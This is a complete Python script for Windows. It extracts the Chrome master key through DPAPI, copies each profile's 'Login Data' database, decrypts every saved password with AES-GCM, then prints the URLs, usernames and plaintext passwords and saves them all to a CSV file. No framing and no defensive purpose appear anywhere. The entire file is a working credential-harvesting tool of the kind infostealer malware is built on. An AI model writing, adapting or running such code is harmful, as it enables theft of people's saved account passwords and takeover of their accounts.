import hashlib
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

def get_secret_key():
    try:
        # Get secret key from Chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        dpapi_key = encrypted_key[5:]  # Remove the "DPAPI" prefix
        secret_key = win32crypt.CryptUnprotectData(dpapi_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome secret key cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        return decrypted_pass.decode()
    except Exception as e:
        error_message = str(e)
        print(error_message)
        print("[ERR] Unable to decrypt password. Please check Chrome version.")
        return ""


def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome database cannot be found")
        return None

if __name__ == '__main__':
    try:
        # Create a CSV file to store decrypted passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file)
            csv_writer.writerow(["index", "url", "username", "password"])

            # Get the secret key
            secret_key = get_secret_key()

            # Search user profiles or default folders where the encrypted login passwords are stored
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]

            for folder in folders:
                # Get the ciphertext from the SQLite database
                chrome_path_login_db = os.path.join(CHROME_PATH, folder, "Login Data")
                conn = get_db_connection(chrome_path_login_db)

                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login

                        if url and username and ciphertext:
                            # Decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)

                            print("Sequence:", index)
                            print("URL:", url)
                            print("User Name:", username)
                            print("Password:", decrypted_password)
                            print("*" * 50)

                            # Save the decrypted password into the CSV file
                            csv_writer.writerow([index, url, username, decrypted_password])

                    # Close the database connection
                    cursor.close()
                    conn.close()

                    # Delete the temporary login database
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR]", str(e))